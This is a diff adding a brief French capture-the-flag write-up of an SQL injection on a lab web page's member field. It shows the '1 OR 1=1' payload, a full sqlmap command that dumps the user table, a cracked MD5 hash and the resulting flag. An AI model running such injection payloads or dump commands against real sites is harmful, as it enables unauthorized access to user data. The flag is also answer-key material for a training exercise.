@@ -1,0 +1,11 @@
+Sur la page /?page=member, le champ id est sensible aux injections SQL.
+
+En entrant 1 OR 1=1, tout les membres seront afficher.
+
+Grace a sqlmap jai pu dump la table user avec la commande : python sqlmap.py -u "http://192.168.1.11/?page=member&id=1&Submit=Submit" --dump
+--ajout image table user
+
+on peut voir que le user_id 5 est le flag.
+
+Plus qu'a prendre 5ff9d0165b4f92b14994e5c685cdce28 le decrypter(md5), cela nous donne FortyTwo et fortytwo en sha256, il nous reste le flag : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
